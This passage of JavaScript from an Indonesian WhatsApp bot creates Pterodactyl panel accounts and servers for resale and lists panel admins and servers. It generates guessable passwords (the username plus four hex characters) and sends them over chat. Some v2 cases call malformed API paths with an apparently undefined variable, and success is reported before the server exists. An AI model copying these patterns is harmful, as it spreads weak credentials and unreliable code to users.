"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c8gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "8024"
let cpu = "190"
let disk = "8024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c8gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "8024"
let cpu = "190"
let disk = "8024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c9gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "9024"
let cpu = "200"
let disk = "9024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,

"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c9gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "9024"
let cpu = "200"
let disk = "9024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c10gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "10024"
let cpu = "210"
let disk = "10024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c10gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "10024"
let cpu = "210"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "cunli": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "cunli-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainV2 + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
var teks = "\n *List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await TamaMods.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Adp Versi 2`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await TamaMods.sendMessage(m.chat, {
  buttons: [
